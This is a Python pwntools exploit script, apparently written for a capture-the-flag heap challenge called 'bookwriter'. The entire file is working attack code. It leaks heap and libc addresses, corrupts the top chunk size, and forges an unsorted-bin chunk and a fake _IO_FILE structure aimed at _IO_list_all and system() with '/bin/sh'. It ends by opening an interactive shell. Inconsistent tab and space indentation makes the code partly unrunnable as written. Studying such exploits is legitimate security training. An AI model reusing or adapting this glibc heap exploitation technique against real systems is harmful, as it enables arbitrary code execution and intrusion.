from pwn import *
import time

context.log_level='debug'

heap_leak=''

def info(author):
	s.recvuntil('Welcome to the BookWriter !')
	s.recvuntil('Author :')
	s.send(author)

def add_page(size, content):
	s.recvuntil('Your choice :')
	s.sendline('1')
	s.recvuntil('Size of page :')
	s.sendline(str(size))
	s.recvuntil('Content :')
	s.send(content)
	s.recvuntil('Done !')
	
def view_page(index):
	s.recvuntil('Your choice :')
        s.sendline('2')
        s.recvuntil('Index of page :')
        s.sendline(str(index))

def edit_page(index,content):
        s.recvuntil('Your choice :')
        s.sendline('3')
        s.recvuntil('Index of page :')
        s.sendline(str(index))
	s.recvuntil('Content:')
	s.send(content)
        s.recvuntil('Done !')


def information(ans,until): #possible heap leak
	global heap_leak
	s.recvuntil('Your choice :')
	s.sendline('4')
	if until is not 0:
		s.recvuntil(until)
        	heap_leak=u64(s.recv(4).ljust(8,'\x00'))-0x10
	else:
		s.recv(1024)
        s.sendline(ans)

if __name__ == "__main__":

	global heap_leak

	binary="./bookwriter"
	#libc="./libc.so.6"
	libc="/lib/x86_64-linux-gnu/libc.so.6"

	#s=process(binary,env={'LD_PRELOAD':'./libc.so.6'})
	s=process(binary)
	e=ELF(binary)
	l=ELF(libc)

	info('A'*0x40)

        add_page(0x16000,'1'*0x1) #page 0 
        add_page(0x16000,'2'*0x1) #page 1

	information('0','A'*0x40)

	add_page(0x1000+8,'B'*(0x1000+8))#page 2

	edit_page(2,'B'*(0x1000+8))  
	'''
	0xf7b410:	0x4242424242424242	0x4242424242424242
	0xf7b420:	0x4242424242424242	0x0000000000020fe1
	'''
	edit_page(2,'\x90'*(0x1000+8)+'\xc1\x0f\x00')

	add_page(0x1000,"C"*0x10)#'sysmalloc -> call top heap chunk free' #page 3
	
	add_page(0x28,'D'*8) #page 4
	view_page(4)
	s.recvuntil('D'*8)
	
	libc_leak=u64(s.recv(6).ljust(8,'\x00'))
	libc_base=libc_leak-0x3c5188
	#libc_base=libc_leak-0x3c4188 #server
	raw_input()
	edit_page(4,'a'*0x28) #unsorted bin size control
	edit_page(4,'a'*0x28+'\x61\xff') #fake unsorted bin size 

	add_page(0x3e8,'X') #page(5)

	payload1='Y'*0x8b90
	payload1+=p64(0x0)+p64(0x1011)
	payload1+='C'*0x10

	add_page(len(payload1),payload1)

        system=libc_base+l.symbols['system']
        _IO_list_all=libc_base+l.symbols['_IO_list_all']

	head = 'C'*0x10	

	payload2=''
	payload2+="/bin/sh\00"+p64(0x61) #top top1
	payload2+=p64(0xdeadbeef)+p64(_IO_list_all-0x10) #top2 top3
	payload2+=p64(2)+p64(3)+p64(0)*6 #top4 ...top11
	payload2+=p64(0)+p64(0) #top12 top13
	payload2+=p64(0)+p64(system) # top14 top15
	payload2+=p64(0)*2 #top16 top17
	payload2+=p64(0)*2 #top18 top19
	payload2+=p64(heap_leak+0x37020+0x90) #top20 
	payload2+=p64(3)+p64(4)+p64(0)+p64(2)+p64(0)*2
	payload2+=p64(heap_leak+0x37020+0x60)

	edit_page(3,head+payload2)

	print "libc_base: "+str(hex(libc_base))
        print "libc_leak: "+str(hex(libc_leak))
	print "system(): "+str(hex(system))
	print "IO_list_all(): "+str(hex(_IO_list_all))
	print "heap_leak: "+str(hex(heap_leak))	
	
	s.interactive()

